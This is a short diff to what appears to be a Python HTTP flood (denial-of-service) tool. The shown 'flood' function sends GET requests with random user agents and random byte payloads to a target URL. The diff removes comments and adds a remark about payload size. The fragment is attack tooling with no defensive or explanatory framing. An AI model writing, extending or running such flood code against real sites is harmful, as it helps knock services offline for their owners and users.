@@ -1,10 +1,8 @@
-# Import modules
 import requests
 import random
 import tools.randomData as randomData
 from colorama import Fore
 
-# Load user agents
 user_agents = []
 for _ in range(30):
     user_agents.append(randomData.random_useragent())
@@ -21,7 +19,7 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(10, 500)))
+    payload = str(random._urandom(random.randint(10, 500))) # was 150, but I changed it.
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
